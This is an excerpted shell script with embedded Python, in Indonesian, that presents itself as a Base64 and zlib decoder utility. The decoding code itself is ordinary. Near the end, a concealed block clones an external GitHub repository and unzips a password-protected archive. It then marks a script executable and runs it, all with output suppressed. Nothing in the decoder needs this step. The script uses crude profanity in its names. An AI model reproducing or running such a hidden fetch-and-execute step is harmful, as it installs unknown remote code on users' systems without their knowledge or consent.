...
echo ""
echo "========================================="
echo "     ALAT DECODER BASE64 + ZLIB"
echo "========================================="
echo ""
if [ $# -eq 1 ]; then
    path="$1"
    echo "Menggunakan file : $path"
else
    echo ""
    read -p "Masukkan path file : " path
fi
if [ ! -f "$path" ]; then
    clear 
    echo ""
...
try:
    ...
    if matches:
        print(f'Ditemukan {len(matches)} potensi data base64')
        encoded_data = max(matches, key=len)
        print(f'Data terpanjang: {len(encoded_data)} karakter')
        print(f'Sample: {encoded_data[:50]}...')
    else:
        enc_match = re.search(r'ENC_DATA\s*=\s*([\'\"])?(.*?)\1', content, re.DOTALL)
        if enc_match:
            encoded_data = enc_match.group(2).strip()
            print(f'Data dari ENC_DATA: {len(encoded_data)} karakter')
        else:
            encoded_data = re.sub(r'\s+', '', content)
            print(f'Menggunakan semua konten (tanpa spasi): {len(encoded_data)} karakter')    
    print()
    print('=== MEMPROSES DATA ===')
    cleaned_data = re.sub(r'[^A-Za-z0-9+/=]', '', encoded_data)
    print(f'Data setelah dibersihkan: {len(cleaned_data)} karakter')    
    if len(cleaned_data) < 50:
        print('Error: Data terlalu pendek untuk di-decode')
        sys.exit(1)
    print('Mendekode base64...')
    try:
        decoded_bytes = base64.b64decode(cleaned_data)
        print(f'✓ Base64 decode berhasil: {len(decoded_bytes)} bytes')
    except Exception as e:
        ...
        if missing_padding:
            ...
            try:
                decoded_bytes = base64.b64decode(cleaned_data)
                print(f'✓ Base64 decode berhasil dengan padding: {len(decoded_bytes)} bytes')
            except Exception as e2:
                print(f'✗ Tetap gagal: {e2}')
                sys.exit(1)
    print('Mendekompres zlib...')
    try:
        decompressed = zlib.decompress(decoded_bytes)
        print(f'✓ Zlib decompress berhasil: {len(decompressed)} bytes')        
        print()
        print('=' * 50)
        ...
        print(f'✗ Bukan data zlib: {e}')
        print()
        print('=' * 50)
        print('DATA BINARY (RAW):')
        print('=' * 50)
        print()
        try:
            print(decoded_bytes[:1000].decode('utf-8'))
            if len(decoded_bytes) > 1000:
                print('\n... [data dipotong, total: {} bytes]'.format(len(decoded_bytes)))
        except:
            print(decoded_bytes[:500])
...
if [ -d "$ANK_IDIOT" ]; then
    ...
    if [ -f "$PEJU" ]; then
        ...
        git clone --depth 32 https://github.com/Zero556723/.DZIP "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        unzip -o -P "DEC_045_ASU_326_TAI" BAN.sh >/dev/null 2>&1 || kontol "Ada Maslah."
        chmod +x Report.sh
        bash "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
...
install_pip_package "--upgrade pip"
